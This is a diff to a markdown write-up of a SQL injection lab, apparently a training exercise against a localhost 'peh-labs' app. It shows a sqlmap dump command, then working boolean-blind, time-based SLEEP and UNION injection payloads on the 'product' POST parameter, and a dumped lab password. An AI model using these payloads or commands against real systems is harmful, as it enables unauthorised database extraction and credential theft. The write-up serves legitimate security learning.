@@ -23,48 +23,59 @@ Dump table names using the cmd:`'+union+select+1,2,3,table_name+from+information
 Give a try with a tool called sqlmap, by coping request data to a file.
 
 ```bash
-└─$ sqlmap -r challange -dump -t injection0x03
+└─$ sqlmap -r challange -dump -T injection0x03_users
         ___
        __H__                                                                                                                                                                                                      
- ___ ___[.]_____ ___ ___  {1.7.6#stable}                                                                                                                                                                          
-|_ -| . [.]     | .'| . |                                                                                                                                                                                         
-|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                         
+ ___ ___[(]_____ ___ ___  {1.7.6#stable}                                                                                                                                                                          
+|_ -| . [(]     | .'| . |                                                                                                                                                                                         
+|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                                         
       |_|V...       |_|   https://sqlmap.org                                                                                                                                                                      
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[*] starting @ 10:57:47 /2023-07-15/
+[*] starting @ 11:08:31 /2023-07-15/
 
-[10:57:47] [INFO] parsing HTTP request from 'challange'
-[10:57:47] [INFO] setting file for logging HTTP traffic
-[10:57:47] [INFO] resuming back-end DBMS 'mysql' 
-[10:57:47] [INFO] testing connection to the target URL
+[11:08:31] [INFO] parsing HTTP request from 'challange'
+[11:08:31] [INFO] resuming back-end DBMS 'mysql' 
+[11:08:31] [INFO] testing connection to the target URL
 sqlmap resumed the following injection point(s) from stored session:
 ---
 Parameter: product (POST)
------------------snip-----------------
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: product=Senpai Knife Set' AND 9407=9407 AND 'fnVn'='fnVn
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: product=Senpai Knife Set' AND (SELECT 4059 FROM (SELECT(SLEEP(5)))pVIN) AND 'RYrH'='RYrH
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: product=Senpai Knife Set' UNION ALL SELECT NULL,NULL,CONCAT(0x71717a6271,0x516b7148714f51565a6d724e736241747349735a4945614d6f6f76514f6769477065726c50526c58,0x71766b7871),NULL-- -
+---
+[11:08:31] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: Apache 2.4.54, PHP 7.4.33
+back-end DBMS: MySQL >= 5.0.12
+[11:08:31] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[11:08:31] [INFO] fetching current database
+[11:08:31] [INFO] fetching columns for table 'injection0x03_users' in database 'peh-labs'
+[11:08:31] [INFO] fetching entries for table 'injection0x03_users' in database 'peh-labs'
 Database: peh-labs
-Table: auth0x03
-[15 entries]
-+---------------+----------------------+---------------+
-| username      | password             | lockout_count |
-+---------------+----------------------+---------------+
-| jessamy       | 1q2w3e4r5t6y7u8i9o0p | 0             |
-| jeremy        | q1w2e3r4t5y6u7i8o9p0 | 0             |
-| admin         | letmein              | 0             |
-| root          | zmxncbvgftr          | 0             |
-| alex          | alexwashere          | 0             |
-| raj           | password123          | 0             |
-| takeshi       | onigiriotebetai      | 0             |
-| hiro          | roosterCarsSunset5   | 0             |
-| heath         | thecybermentor       | 0             |
-| user1         | user1                | 0             |
-| teamaster     | idrinklotsoftea      | 0             |
-| operator      | alskdjfhg            | 0             |
-| bob           | 123456               | 0             |
-| alice         | password             | 0             |
-| administrator | cheese               | 0             |
-+---------------+----------------------+---------------+
+Table: injection0x03_users
+[1 entry]
++----------+------------------+
+| username | password         |
++----------+------------------+
+| takeshi  | onigirigadaisuki |
++----------+------------------+
+
+[11:08:31] [INFO] table '`peh-labs`.injection0x03_users' dumped to CSV file '/home/singhx/.local/share/sqlmap/output/localhost/dump/peh-labs/injection0x03_users.csv'
+[11:08:31] [INFO] fetched data logged to text files under '/home/singhx/.local/share/sqlmap/output/localhost'
+
+[*] ending @ 11:08:31 /2023-07-15/
+
+
 ```
 
 W00t Cracked...
